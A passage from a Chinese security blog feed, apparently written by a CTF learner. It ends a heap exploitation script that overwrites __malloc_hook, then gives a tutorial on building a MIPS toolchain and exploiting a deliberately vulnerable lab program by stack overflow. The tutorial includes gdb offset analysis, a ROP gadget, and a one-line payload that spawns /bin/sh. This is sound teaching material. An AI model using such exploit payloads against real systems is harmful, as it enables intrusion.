hex(stderr)</span><br><span class="line">libc_base = stderr +<span class="number">0x20</span> -libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>] </span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(malloc_hook)</span><br><span class="line">fack_chunk = malloc_hook - <span class="number">0x23</span></span><br><span class="line">onegadget = one[<span class="number">3</span>] + libc_base</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">delt(<span class="number">0</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(fack_chunk))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">pay = <span class="number">0x13</span>*<span class="string">'A'</span> + p64(onegadget)</span><br><span class="line">edit(<span class="number">1</span>,len(pay),pay)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x20</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;任意读原理&quot;&gt;&lt;a href=&quot;#任意读原理&quot; class=&quot;headerlink&quot; title=&quot;任意读原理&quot;&gt;&lt;/a&gt;任意读原理&lt;/h3&gt;&lt;p&gt;stderr、stdout、stdin这三个函数拥有IO_FILE结构体，要利用IO_FILE实现任意读，就要利用到stdout。&lt;br&gt;首先，puts和write函数的执行，都会通过 &lt;code&gt;_IO_new_file_overflow&lt;/code&gt; 这个函数最后执行 &lt;code&gt;_IO_overflow&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;puts&lt;/strong&gt;:  &lt;em&gt;_IO_puts&lt;/em&gt; –&amp;gt; &lt;em&gt;_IO_sputn&lt;/em&gt; –&amp;gt; &lt;em&gt;_IO_new_file_xsputn&lt;/em&gt; –&amp;gt; &lt;em&gt;_IO_new_file_overflow&lt;/em&gt; –&amp;gt; &lt;em&gt;_IO_do_write&lt;/em&gt; –&amp;gt; &lt;em&gt;new_do_write&lt;/em&gt; –&amp;gt; &lt;em&gt;_IO_SYSWRITE&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;fwrite&lt;/strong&gt;: &lt;em&gt;_IO_fwrite&lt;/em&gt; –&amp;gt; &lt;em&gt;_IO_sputn&lt;/em&gt; –&amp;gt; &lt;em&gt;_IO_new_file_xsputn&lt;/em&gt; –&amp;gt; &lt;em&gt;_IO_new_file_overflow&lt;/em&gt; –&amp;gt; &lt;em&gt;_IO_do_write&lt;/em&gt; –&amp;gt; &lt;em&gt;new_do_write&lt;/em&gt; –&amp;gt; &lt;em&gt;_IO_SYSWRITE&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;_IO_new_file_xsputn的源码：&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="pwn知识点" scheme="https://c0yo7e.github.io/tags/pwn%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    
  </entry>
  
  <entry>
    <title>mips编译环境配置与简单栈溢出</title>
    <link href="https://c0yo7e.github.io/2020/05/12/mips%E7%BC%96%E8%AF%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <id>https://c0yo7e.github.io/2020/05/12/mips编译环境配置与简单栈溢出/</id>
    <published>2020-05-12T10:00:33.000Z</published>
    <updated>2020-08-02T05:12:26.242Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境编译"><a href="#环境编译" class="headerlink" title="环境编译"></a>环境编译</h2><p>首先就是搭一下编译环境，（==最好选16的ubuntu==，我曾经觉得18的Ubuntu长得好看，然后在上面搭了一天的环境之后发现，并不能动态调试，然后重新在16里又再搭了一天）</p><h3 id="buildroot"><a href="#buildroot" class="headerlink" title="buildroot"></a>buildroot</h3><p>下载：<a href="https://buildroot.org/download" target="_blank" rel="noopener">buildroot</a></p><p>解压之后，configs里面有一个<code>qemu_mips32r2el_malta_defconfig</code>这样的配置，可以进去找找看有没有，我们回到主目录，直接<code>make qemu_mips32r2el_malta_defconfig</code></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">coyote@ubuntu:~/buildroot<span class="number">-2020.02</span><span class="number">.1</span>$ make qemu_mips32r2el_malta_defconfig</span><br><span class="line">coyote@ubuntu:~/buildroot<span class="number">-2020.02</span><span class="number">.1</span>$ make</span><br></pre></td></tr></table></figure><p>make qemu…那个命令就是配置相对应的环境，就不用手动<code>make menuconfig</code> 去设置了。</p><a id="more"></a><p>进入menuconfig界面之后选择第一项<code>Target Architecture</code>，改成<code>MIPS（little endian）</code>（默认编译小端程序），另外，选择<code>Toolchain</code>，将<code>Kernel Headers</code>的Linux版本改成自己主机的Linux版本（因为我们编译出的MIPS交叉工具是需要在我们的主机上运行的）</p><p>之后make就好了（过程可能会很漫长，耐心等吧<br>编译完成之后，在<code>buildroot/output/host/bin</code><br>下就有<code>mipsel-linux-gcc</code>了，我们就可以通过它编译了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/buildroot-2020.02.1/output/host/bin/mipsel-linux-gcc test.c -o test -static</span><br></pre></td></tr></table></figure><p>不过这样还是有点麻烦，所以我们可以直接配置环境变量</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gedit ~/.bashrc</span><br><span class="line">export PATH=$PATH:/home/coyote/buildroot<span class="number">-2020.02</span><span class="number">.1</span>/output/host/usr/bin   <span class="comment">#写入文件</span></span><br><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure><p>然后我们就可以直接通过命令编译,不用带上路径了</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mipsel-linux-gcc test.c -o test -static</span><br></pre></td></tr></table></figure><h3 id="IDA-mipsrop"><a href="#IDA-mipsrop" class="headerlink" title="IDA mipsrop"></a>IDA mipsrop</h3><p>下载 <a href="https://github.com/devttys0/ida/blob/master/plugins/mipsrop/mipsrop.py" target="_blank" rel="noopener">mipsrop.py</a></p><p>直接放到plugins下,然后重启就可以在ida的search里面找到<code>mips rop gadgets</code></p><p>点击这个之后，可以在idapython框里面输入mipsrop的命令，主要如下</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mipsrop.stackfinder() <span class="comment"># 寻找栈数据可控的 rop，建立和 a0、a1 寄存器的关系</span></span><br><span class="line">mipsrop.summary() <span class="comment"># 列出所有的可用 rop</span></span><br><span class="line">mipsrop.system() <span class="comment"># 寻找命令执行的的rop</span></span><br><span class="line">mipsrop.find(xxx) <span class="comment"># 查找 find 函数参数的 rop，类似正则匹配</span></span><br></pre></td></tr></table></figure><h3 id="mips反编译"><a href="#mips反编译" class="headerlink" title="mips反编译"></a>mips反编译</h3><p>这真是个令人头秃的东西</p><p>mips反编译有三个：</p><blockquote><p>retdec<br>ghidra<br>jeb-mips</p></blockquote><h4 id="ida-retdec-插件"><a href="#ida-retdec-插件" class="headerlink" title="ida retdec 插件"></a>ida retdec 插件</h4><blockquote><p>retdec-idaplugin：<a href="https://github.com/avast/retdec-idaplugin/releases" target="_blank" rel="noopener">https://github.com/avast/retdec-idaplugin/releases</a><br>retdec：<a href="https://github.com/avast/retdec/releases" target="_blank" rel="noopener">https://github.com/avast/retdec/releases</a></p></blockquote><p>步骤：</p><ul><li>把idaplugin里面的两个dll放到ida下面的plugins里面</li><li>打开ida，在options下面找到 <code>RetDec Plugin Setting...</code></li><li>点击去，把下载好的retdec文件下的<code>retdec-decompiler.py</code>（在bin里面）的地址链入<code>RetDec script</code>里面</li><li>点 <code>Edit-&gt;plugins-&gt;retargetable decompiler</code>就可以实现反编译出c了（快捷键好像是ctrl+d，不过因机而定的）</li></ul><p>这个反编译出来的代码真的好丑啊！不知道是不是我的问题，它真的就是c文件，只能从上往下看。<br><img src="/2020/05/12/mips编译环境配置与简单栈溢出/1.png" alt></p><p>还不如直接<code>python /path/to/retdec-decompiler.py test</code> 编译出c文件之后在vs里面看，至少还有代码高亮。</p><p>如果有大佬的retdec可以反编译得很方便的话就教教我吧！</p><h4 id="jeb-mips"><a href="#jeb-mips" class="headerlink" title="jeb-mips"></a>jeb-mips</h4><p>由于实在忍不了retdec的简略，就尝试了jeb-mips</p><blockquote><p>jeb-mips：<a href="https://www.pnfsoftware.com/jeb/demomips" target="_blank" rel="noopener">https://www.pnfsoftware.com/jeb/demomips</a></p></blockquote><p>解压之后windows下就直接点<code>jeb_wincon.bat</code>运行（不过不知道是不是我电脑的问题还是java版本的问题，点开之后运行个一分钟就会自动退出）<br>大佬的Mac是可以运行的，我的win挣扎了一个下午也没解决这个问题，最后安在了linux下<br><img src="/2020/05/12/mips编译环境配置与简单栈溢出/2.png" alt></p><h4 id="Ghidra"><a href="#Ghidra" class="headerlink" title="Ghidra"></a>Ghidra</h4><p>我不是很熟jeb的操作，data变code我都很迷茫，右键<code>disassemble</code>好像没有作用（这个可能是我的问题，和软件无关）所以我又去找了ghidra下载</p><blockquote><p>ghidra（要梯子）：<a href="https://ghidra-sre.org/ghidra_9.0.4_PUBLIC_20190516.zip" target="_blank" rel="noopener">https://ghidra-sre.org/ghidra_9.0.4_PUBLIC_20190516.zip</a></p></blockquote><p>解压之后直接点<code>ghidraRun.bat</code>运行，好像是会新建一个工程，然后在<code>file-&gt;import file</code>选择你想反编译的文件导入工程，文件就会显示在窗口里，如图<br><img src="/2020/05/12/mips编译环境配置与简单栈溢出/4.png" alt></p><p>双击文件名就可以打开了</p><p>效果如图：<br><img src="/2020/05/12/mips编译环境配置与简单栈溢出/3.png" alt></p><p>双击汇编就可以解析成伪c（感觉上代码好冗杂，看起来可能比较费时间），但是它选中汇编代码右键会有很多不同的disassemble模式，比如MIPS、MIPS16el、static等等</p><h2 id="mips的指令集特点"><a href="#mips的指令集特点" class="headerlink" title="mips的指令集特点"></a>mips的指令集特点</h2><p>主要的两个概念</p><ul><li>叶子函数：当前函数不再调用其他函数。</li><li>非叶子函数：当前函数调用其他函数。</li></ul><p>指令特点：</p><ul><li>固定4字节指令长度。</li><li>MIPS默认不把子函数的返回地址存放到栈中，而是存放到$ra寄存器中。</li><li>流水线效应。MIPS采用了高度的流水线，最重要的两个效应就是分支延迟效应和载入延迟效应。</li><li>没有堆栈直接操作的指令，也就是没有 push 和 pop 指令</li></ul><p>具体可以参考：</p><ul><li><a href="https://ray-cp.github.io/archivers/MIPS_Debug_Environment_and_Stack_Overflow#mips-%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80" target="_blank" rel="noopener">mips的汇编基础</a></li><li><a href="https://blog.csdn.net/gujing001/article/details/8476685" target="_blank" rel="noopener">mips的指令和用法</a></li></ul><h2 id="mips的溢出"><a href="#mips的溢出" class="headerlink" title="mips的溢出"></a>mips的溢出</h2><h3 id="rop链"><a href="#rop链" class="headerlink" title="rop链"></a>rop链</h3><p>用了全网都在用的那个例子，也是《揭秘家用路由器0day漏洞挖掘技术》里面的例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_system_0</span><span class="params">(<span class="keyword">int</span> code,<span class="keyword">char</span> *cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">255</span>];</span><br><span class="line">    <span class="comment">//sleep(1);</span></span><br><span class="line">    system(cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> fileLen = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">fileData</span>;</span></span><br><span class="line">    FILE *fp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0</span> == stat(<span class="string">"passwd"</span>,&amp;fileData))</span><br><span class="line">        fileLen = fileData.st_size;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((fp = fopen(<span class="string">"passwd"</span>,<span class="string">"rb"</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Cannot open file passwd!n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ch=fgetc(fp);</span><br><span class="line">    <span class="keyword">while</span>(count &lt;= fileLen)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[count++] = ch;</span><br><span class="line">        ch = fgetc(fp);</span><br><span class="line">    &#125;</span><br><span class="line">    buf[--count] = 'x00';</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(buf,<span class="string">"adminpwd"</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        do_system_0(count,<span class="string">"ls -l"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"you have an invalid password!n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译完之后，丢进ida看看程序是干什么的</p><p>会发现程序读入了一个passwd文件，然后passwd不对就会输出”you have an invalid password!n”</p><p>我们要利用溢出来绕过这个</p><p>所以我们先往passwd里面填充大量字符</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">coyote@ubuntu:~<span class="regexp">/mips_test$ python -c "print 'a'*0x200" &gt; passwd</span></span><br></pre></td></tr></table></figure><p>起qemu，然后gdb连接</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#terminal 1</span></span><br><span class="line">coyote@ubuntu:~/mips_test$ qemu-mipsel -g <span class="number">1234</span> ./test  <span class="comment">#-g是开放远程连接，gdb调试，1234是开放的端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#terminal 2</span></span><br><span class="line">coyote@ubuntu:~/mips_test$ gdb-multiarch ./test</span><br><span class="line">pwndbg&gt; target remote :<span class="number">1234</span> attach</span><br><span class="line"><span class="comment"># 如果第一次远程调的话，先</span></span><br><span class="line"><span class="comment"># pwndbg&gt;set arch mips</span></span><br><span class="line"><span class="comment"># pwndbg&gt;set endian little</span></span><br></pre></td></tr></table></figure><h4 id="gdb的调试分析过程："><a href="#gdb的调试分析过程：" class="headerlink" title="gdb的调试分析过程："></a>gdb的调试分析过程：</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; target remote :<span class="number">1234</span> attach</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x61616161 in ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> V0   <span class="number">0x0</span></span><br><span class="line"> V1   <span class="number">0x1</span></span><br><span class="line"> A0   <span class="number">0x1</span></span><br><span class="line"> A1   <span class="number">0x1</span></span><br><span class="line"> A2   <span class="number">0x4b</span></span><br><span class="line"> A3   <span class="number">0x39</span></span><br><span class="line"> T0   <span class="number">0x0</span></span><br><span class="line"> T1   <span class="number">0x2a7f6573</span></span><br><span class="line"> T2   <span class="number">0xffffffff</span></span><br><span class="line"> T3   <span class="number">0x64726f77</span> (<span class="string">'word'</span>)</span><br><span class="line"> T4   <span class="number">0x0</span></span><br><span class="line"> T5   <span class="number">0x0</span></span><br><span class="line"> T6   <span class="number">0x0</span></span><br><span class="line"> T7   <span class="number">0x0</span></span><br><span class="line"> T8   <span class="number">0x1e</span></span><br><span class="line"> T9   <span class="number">0x40479c</span> (__pthread_return_0) ◂— jr     $ra</span><br><span class="line"> S0   <span class="number">0x0</span></span><br><span class="line"> S1   <span class="number">0x410000</span> (__preinit_array_start) ◂— <span class="number">0xffffffff</span></span><br><span class="line"> S2   <span class="number">0x0</span></span><br><span class="line"> S3   <span class="number">0x0</span></span><br><span class="line"> S4   <span class="number">0x0</span></span><br><span class="line"> S5   <span class="number">0x0</span></span><br><span class="line"> S6   <span class="number">0x0</span></span><br><span class="line"> S7   <span class="number">0x0</span></span><br><span class="line"> S8   <span class="number">0x61616161</span> (<span class="string">'aaaa'</span>)</span><br><span class="line"> FP   <span class="number">0x76ffec48</span> ◂— <span class="string">'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n0'</span></span><br><span class="line"> SP   <span class="number">0x76ffec48</span> ◂— <span class="string">'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n0'</span></span><br><span class="line"> PC   <span class="number">0x61616161</span> (<span class="string">'aaaa'</span>)</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line">Invalid address <span class="number">0x61616161</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ fp sp  <span class="number">0x76ffec48</span> ◂— <span class="string">'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n0'</span></span><br><span class="line"><span class="meta">... </span>↓</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span> <span class="number">61616161</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure><p>通过这里可以看到跳转地址被改为了<code>0x61616161</code>，而存放这个内容的地址是<code>0x76ffec48</code>,所以计算从开始读入passwd文件的位置到跳转地址的字符偏移。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x76ffea00</span></span><br><span class="line"><span class="number">0x76ffea00</span>:<span class="number">0x00402744004105f4</span><span class="number">0x0000000076ffea7c</span></span><br><span class="line"><span class="number">0x76ffea10</span>:<span class="number">0x0000000000000000</span><span class="number">0x004011e0004181e0</span></span><br><span class="line"><span class="number">0x76ffea20</span>:<span class="number">0x004105f800413c80</span><span class="number">0x0000000000000002</span></span><br><span class="line"><span class="number">0x76ffea30</span>:<span class="number">0x0000000000413c80</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x76ffea40</span>:<span class="number">0x00400a3476ffea78</span><span class="number">0x00400ac000000000</span></span><br><span class="line"><span class="number">0x76ffea50</span>:<span class="number">0x00000000000001b6</span><span class="number">0x00000000004181e0</span></span><br><span class="line"><span class="number">0x76ffea60</span>:<span class="number">0x0041000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x76ffea70</span>:<span class="number">0x004006a000000000</span><span class="number">0x0040e76a00000000</span></span><br><span class="line"><span class="number">0x76ffea80</span>:<span class="number">0x0000000000001000</span><span class="number">0x00000000004181e0</span></span><br><span class="line"><span class="number">0x76ffea90</span>:<span class="number">0x00000201000000ff</span><span class="number">0x0041490800000201</span></span><br><span class="line"><span class="number">0x76ffeaa0</span>:<span class="number">0x0041490800414908</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x76ffeab0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x76ffeac0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x76ffead0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x76ffeae0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x76ffeaf0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x76ffeb00</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x76ffeb10</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x76ffeb20</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x76ffeb30</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line">pwndbg&gt; distance <span class="number">0x76ffeaa8</span> <span class="number">0x76ffec48</span></span><br><span class="line">0x76ffeaa8-&gt;0x76ffec48 is 0x1a0 bytes (0x68 words)</span><br></pre></td></tr></table></figure><p>所以我们要填充<code>&#39;a&#39;*0x19c</code>使得跳转地址没有被覆盖</p><p>ida里通过mips rop找到可用的rop</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;mipsrop.stackfinder()</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  <span class="number">0x004034A0</span>  |  addiu $a1,$sp,<span class="number">0x58</span>+var_40                           |  jr    <span class="number">0x58</span>+var_4($sp)                 |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">Found <span class="number">1</span> matching gadgets</span><br></pre></td></tr></table></figure><p><code>addiu $a1,$sp,0x58+var_40</code> –&gt; sp+0x18的位置放入参数(即’/bin/sh’)</p><blockquote><p>0x58+var_40 = 0x58-0x40 = 0x18</p></blockquote><p><code>jr    0x58+var_4($sp)</code> –&gt; 跳转执行sp+0x54位置的函数</p><blockquote><p>0x58+var_4($sp) = 0x58 - 0x4 = 0x54</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x $sp+<span class="number">24</span></span><br><span class="line">$<span class="number">2</span> = <span class="number">0x76ffec60</span></span><br><span class="line">pwndbg&gt; distance <span class="number">0x76ffec60</span> <span class="number">0x76ffeaa8</span></span><br><span class="line">0x76ffec60-&gt;0x76ffeaa8 is -0x1b8 bytes (-0x6e words)</span><br></pre></td></tr></table></figure><h4 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h4><p>其实之前的那个跳转地址就是我们的sp，所以我们再填充0x18个字节之后填入<code>&#39;/bin/sh/x00&#39;</code>作为system的参数，然后再填0x34个字节后，填入<code>do_system</code>的地址</p><h4 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">coyote@ubuntu:~/mips_test$ python -c <span class="string">"print 'a'*0x19c + '\xa0\x34\x40\x00' + 0x18*'b' + '/bin/sh\x00' + 'c'*0x34 + '\x70\x03\x40\x00'"</span> &gt; passwd</span><br><span class="line">coyote@ubuntu:~/mips_test$ qemu-mipsel ./test</span><br><span class="line">$ ls</span><br><span class="line">passwdtest  test_1  test.c</span><br></pre></td></tr></table></figure><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><ul><li><a href="https://www.jianshu.com/p/ba12cd4e530a" target="_blank" rel="noopener">https://www.jianshu.com/p/ba12cd4e530a</a></li><li><a href="https://ray-cp.github.io/archivers/MIPS_Debug_Environment_and_Stack_Overflow" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/MIPS_Debug_Environment_and_Stack_Overflow</a></li></ul><h3 id="书目推荐："><a href="#书目推荐：" class="headerlink" title="书目推荐："></a>书目推荐：</h3><ul><li>《揭秘家用路由器0day漏洞挖掘技术》<br>（<a href="https://raw.githubusercontent.com/ray-cp/MIPS/master/book_note/%E6%8F%AD%E7%A7%98%E5%AE%B6%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A80day%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF.pdf/" target="_blank" rel="noopener">pdf版</a>）</li></ul>]]></content>
    
    <summary type="html">
    
